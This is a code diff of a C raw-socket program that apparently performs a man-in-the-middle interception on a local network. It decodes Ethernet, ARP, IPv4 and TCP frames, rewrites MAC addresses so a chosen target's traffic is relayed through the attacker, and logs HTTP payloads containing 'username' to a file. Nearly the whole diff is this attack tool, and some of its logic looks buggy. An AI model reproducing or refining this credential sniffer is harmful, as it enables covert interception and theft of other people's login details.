@@ -90,38 +90,34 @@ unsigned char mac[6];
 unsigned char ip[4];
 
 unsigned char maskMac[]   = {0xd0,0x17,0xc2,0x9c,0x42,0x28};
-unsigned char targetMac[] = {0x70,0x54,0xd2,0x44,0x95,0x9e};//lk  //{0xac,0x87,0xa3,0x2c,0x6b,0xaf}; //pk
-int targetIp[4]={192.168.1.71};
+unsigned char targetMac[] =  {0x70,0x54,0xd2,0x44,0x95,0x9e};//{0x70,0x54,0xd2,0x44,0x95,0x9e};//lk  //{0xac,0x87,0xa3,0x2c,0x6b,0xaf}; //pk
+int targetIp[4]={192,168,1,61};
 
 EtherNetFram eth;
 IPv4Header ipv4Header;
 TCP_packet tcp;
 ARP_Packet arp_packet;
+LL_SockAddr ll_sock_disc;
+
+
+//Function dec
+void forward(unsigned char *buf); 
+void setUpForwarding();
+int isFromTarget();
+void writeToFile(unsigned char *data,int DataSize);
 
 
  //DeCode EtherNet
- void decodeEther(unsigned char *buf, EtherNetFram *eth){
-      //  printf("\n dst => %02X:%02X:%02X:%02X:%02X:%02X",buf[0],buf[1],buf[2],buf[3],buf[4],buf[5]);
-      //  printf("\n src => %02X:%02X:%02X:%02X:%02X:%02X",buf[6],buf[7],buf[8],buf[9],buf[10],buf[11]);
-      //  printf("\n type => %02X:%02X",buf[12],buf[13]);
+ void decodeEther(unsigned char *buf, EtherNetFram *eth, int debug ){
+    if(debug){
+       printf("\n dst => %02X:%02X:%02X:%02X:%02X:%02X",buf[0],buf[1],buf[2],buf[3],buf[4],buf[5]);
+       printf("\n src => %02X:%02X:%02X:%02X:%02X:%02X",buf[6],buf[7],buf[8],buf[9],buf[10],buf[11]);
+       printf("\n type => %02X:%02X",buf[12],buf[13]);
+      }
        memcpy(eth,buf,14);
  }
 
-// DeCode IPv4 Header
-void decodeIPv4(unsigned char *buf, IPv4Header *ipv4){
-    memcpy(ipv4, &buf[14], 20);
-
-  // printf("\n protocal :%02X",ipv4->protocal);
-    // printf("\n header len :%d",ipv4->hl);
-    // printf("\n payload len :%d",htons(ipv4->tol));
-    // printf("\n frag flags :%03X",ipv4->flags);  
-    // printf("\n Type of Service :%02X\n",ipv);   
-    
-    // printf("\n src Addresss Decoded :%d.%d.%d.%d",(int)ipv4->src_addr[0], (int)ipv4->src_addr[1], (int)ipv4->src_addr[2], (int)ipv4->src_addr[3]);
-    // printf("\n Dst Addresss Decoded :%d.%d.%d.%d",(int)ipv4->dst_addr[0], (int)ipv4->dst_addr[1], (int)ipv4->dst_addr[2], (int)ipv4->dst_addr[3]);
-}  
-
-//Decode ARP
+ //Decode ARP
 void decodeARP(unsigned char *buf, ARP_Packet *arp){
  memcpy(arp, &buf[14], 28);
  
@@ -149,41 +145,20 @@ void decodeARP(unsigned char *buf, ARP_Packet *arp){
  printf("  TPA => %d.%d.%d.%d \n\n",(int)arp_packet.TPA_2[0],(int)arp_packet.TPA_2[1], (int)arp_packet.TPA_4[0],(int)arp_packet.TPA_4[1]);
 }
 
-void writeToFile(unsigned char *data, int len){ 
- FILE *logFile = fopen("/home/satyaprakash/Algo/log1.txt","ab");
-      if(logFile == NULL){
-        printf("Failed to open file ..\n");
-      }
-      else{
-         printf("\n writing to File data:%d",len);
-         fwrite(devider,1,len,logFile); //Devider
-         //Src Dst mac
-        //  memcpy(mac,eth.src_addr,6);
-         
-        //  fprintf(logFile,"%s",eth.src_addr);
-        //  fprintf(logFile,"%s","\n");
-        //  fprintf(logFile,"%s",ipv4Header.src_addr);
-        //  fprintf(logFile,"%s","\n\n");
-        //  fprintf(logFile,"%s",eth.dst_addr); 
-        //  fprintf(logFile,"%s","\n");
-        //  fprintf(logFile,"%s",ipv4Header.dst_addr); 
-        //  fprintf(logFile,"%s","\n\n");
-        
-         fwrite(data,1,len,logFile); 
-         fclose(logFile);
-      }
-   
-  //  if(len > 10 )//&& counter > 50)
-  //     run = 0; 
 
-    // counter++;    
-} 
+// DeCode IPv4 Header
+void decodeIPv4(unsigned char *buf, IPv4Header *ipv4){
+    memcpy(ipv4, &buf[14], 20);
 
-//Function dec
-void forward(unsigned char *buf); 
-void setUpForwarding();
-int isFromTraget();
-
+  // printf("\n protocal :%02X",ipv4->protocal);
+    // printf("\n header len :%d",ipv4->hl);
+    // printf("\n payload len :%d",htons(ipv4->tol));
+    // printf("\n frag flags :%03X",ipv4->flags);  
+    // printf("\n Type of Service :%02X\n",ipv);   
+    
+    printf("\n src Addresss Decoded :%d.%d.%d.%d",(int)ipv4->src_addr[0], (int)ipv4->src_addr[1], (int)ipv4->src_addr[2], (int)ipv4->src_addr[3]);
+    printf("\n Dst Addresss Decoded :%d.%d.%d.%d",(int)ipv4->dst_addr[0], (int)ipv4->dst_addr[1], (int)ipv4->dst_addr[2], (int)ipv4->dst_addr[3]);
+}  
 
 //Decode TCP PAcket
 void decodeTCP(unsigned char *buf, TCP_packet *tcp){
@@ -207,32 +182,69 @@ void decodeTCP(unsigned char *buf, TCP_packet *tcp){
         printf("\n data size :%lu",sizeof(data));
         memcpy(data,&buf[header], DataSize-header);
 
-        printf("HTTP.. Payload ...");
+        printf("\n HTTP.. Payload ...");
         printf("\n src Addresss Decoded :%d.%d.%d.%d",(int)ipv4Header.src_addr[0], (int)ipv4Header.src_addr[1], (int)ipv4Header.src_addr[2], (int)ipv4Header.src_addr[3]);
-        printf("\n Dst Addresss Decoded :%d.%d.%d.%d",(int)ipv4Header.dst_addr[0], (int)ipv4Header.dst_addr[1], (int)ipv4Header.dst_addr[2], (int)ipv4Header.dst_addr[3]);
+        // printf("\n Dst Addresss Decoded :%d.%d.%d.%d",(int)ipv4Header.dst_addr[0], (int)ipv4Header.dst_addr[1], (int)ipv4Header.dst_addr[2], (int)ipv4Header.dst_addr[3]);
         
-        //chk is trafic from target then forward
-        if(isFromTraget()){
-          //Forward the tarfic 
-          memcpy(&buf, &maskMac, 6); // dst macto mask mac 
-          memcpy(&buf[6], &targetMac, 6); // change src mac back to target
-          forward(buf);
-        }
+        // //chk is trafic from target then forward
+        //int st = isFromTarget();
 
+        if(isFromTarget()){
+          printf("\n Is from target");
+          //Forward the tarfic 
+           memcpy(buf, &maskMac, 6); // dst macto mask mac 
+           memcpy(&buf[6], &targetMac, 6); // change src mac back to target
+           forward(buf);
+          //  exit(0);
+        }
+        
         if(strstr(data, "username"))
           writeToFile(data,sizeof(data));
+
+        // if(sizeof(data) == 1)
+          // writeToFile(data,sizeof(data));  
     }
    }
 }
 
+void writeToFile(unsigned char *data, int len){ 
+ FILE *logFile = fopen("/home/satyaprakash/Algo/log1.txt","ab");
+      if(logFile == NULL){
+        printf("Failed to open file ..\n");
+      }
+      else{
+         printf("\n writing to File data:%d",len);
+         fwrite(devider,1,len,logFile); //Devider
+         //Src Dst mac
+        //  memcpy(mac,eth.src_addr,6);
+         
+        //  fprintf(logFile,"%s",eth.src_addr);
+        //  fprintf(logFile,"%s","\n");
+        //  fprintf(logFile,"%s",ipv4Header.src_addr);
+        //  fprintf(logFile,"%s","\n\n");
+        //  fprintf(logFile,"%s",eth.dst_addr); 
+        //  fprintf(logFile,"%s","\n");
+        //  fprintf(logFile,"%s",ipv4Header.dst_addr); 
+        //  fprintf(logFile,"%s","\n\n");
+        
+         fwrite(data,1,len,logFile); 
+         fclose(logFile);
+         exit(0);
+      }
+   
+  //  if(len > 10 )//&& counter > 50)
+  //     run = 0; 
 
-//forward Data
-int Sendstatus;
-void forward(unsigned char *buf){
-  Sendstatus = send(forwardSock, buf, DataSize, 0);
-  if(Sendstatus < 0){
-    printf('\n forwarding failed ..%d',errno);
-  }
+    // counter++;    
+} 
+
+int isFromTarget(){
+  printf("\n checking target ip");
+  
+  if(targetIp[3] ==  (int)ipv4Header.src_addr[3])
+      return 1;
+  else
+    return 0;
 }
    
 void setUpForwarding(){
@@ -275,10 +287,21 @@ void setUpForwarding(){
 
 }
 
-
-int isFromTraget(){
-   
+//forward Data
+int Sendstatus;
+void forward(unsigned char *buf){
+  printf("\n Forwarding Data...");
+  Sendstatus = send(forwardSock, buf, DataSize, 0);
+  if(Sendstatus < 0){
+    printf("\n forwarding failed ..%d",errno);
   }
+  // else{
+  //   printf("\n forwarded data ..%d",Sendstatus);
+  // }
+}
+
+
+
 
 void main(){
   int MAXMSG = 65536;
@@ -308,7 +331,7 @@ void main(){
         // printf("\n\n\n.........Intercept Some data size..%d\n",data);
 
         // EtherNetFram eth;
-        decodeEther(buf,&eth);
+        decodeEther(buf,&eth,0);
         switch(htons(eth.type)){
           
           case 0x0800:
